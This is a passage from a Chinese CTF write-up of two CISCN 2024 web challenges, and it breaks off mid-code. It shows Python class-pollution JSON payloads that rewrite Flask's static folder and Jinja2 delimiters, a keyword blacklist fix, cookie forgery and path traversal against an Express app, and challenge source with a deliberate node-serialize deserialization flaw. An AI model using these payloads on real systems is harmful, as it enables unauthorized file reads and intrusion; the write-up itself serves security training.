src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623100650218.png" alt="image-20240623100650218"></p><p>嗯？我flag呢？</p><p>那就用之前boogipop的非预期打法，污染静态文件夹位置：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"adminer"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0061\u0070\u0070"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u005fstatic\u005ffolder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后访问：<code>/static/flag</code>即可</p><p>预期解：<a href="https://www.cnblogs.com/gxngxngxn/p/18264279">https://www.cnblogs.com/gxngxngxn/p/18264279</a></p><p>我们知道python的模板渲染标识符一般是<code>&#123;&#123;&#125;&#125;</code>，所以上面输出<code>[%flag%]</code>是因为没渲染成功，需要污染jinja2的语法标识符为<code>[%%]</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span> <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"[%"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">"%]"</span> <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="FIX-2"><a href="#FIX-2" class="headerlink" title="FIX"></a>FIX</h2><p>继续加已经有的黑名单就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> json<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">generate_random_md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    random_string <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>random_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklisted_patterns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'app'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">,</span><span class="token string">'secret'</span><span class="token punctuation">,</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'folder'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pattern <span class="token keyword">in</span> blacklisted_patterns<span class="token punctuation">:</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Recursive merge function</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> generate_random_md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    session<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> password    Evil <span class="token operator">=</span> evil<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> Evil<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">templates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">and</span> password<span class="token punctuation">:</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">"adminer"</span> <span class="token keyword">and</span> password <span class="token operator">==</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"important.html"</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Hello,  This is the POLLUTED page.'</span></span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="bigfish"><a href="#bigfish" class="headerlink" title="bigfish"></a>bigfish</h1><h2 id="BREAK-3"><a href="#BREAK-3" class="headerlink" title="BREAK"></a>BREAK</h2><p>访问admin路由的时候发现出现了<code>set-cookie</code>，给了两个cookie：<code>is_admin=false</code>和<code>username</code></p><p>尝试修改后传入admin路由</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623122451012.png" alt="image-20240623122451012"></p><p>成功访问</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623122644430.png" alt="image-20240623122644430"></p><p>猜测QQ管理存在任意文件读取，改存储位置为fish.js，发现可以读到</p><p>测试发现可以目录穿越，翻了一下环境变量发现没flag，还是老老实实审代码吧（</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> schedule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-schedule'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Change working directory to /srv</span>process<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'/srv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> rule1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">schedule<span class="token punctuation">.</span>RecurrenceRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rule1<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 定时清除</span><span class="token keyword">let</span> job1 <span class="token operator">=</span> schedule<span class="token punctuation">.</span><span class="token function">scheduleJob</span><span class="token punctuation">(</span>rule1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token string">"#获取的数据信息\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wriet error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_path <span class="token operator">=</span> <span class="token string">"data.html"</span><span class="token punctuation">;</span><span class="token comment">// Middleware to set default cookies for /admin route</span><span class="token keyword">function</span> <span class="token function">setDefaultAdminCookies</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'normal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//主页</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后台管理</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">datadir</span> <span class="token operator">:</span> data_path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>data_path <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//已弃用的登录</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> obj <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//QQ</span>app<span class="token punctuation">.</span><span class="token 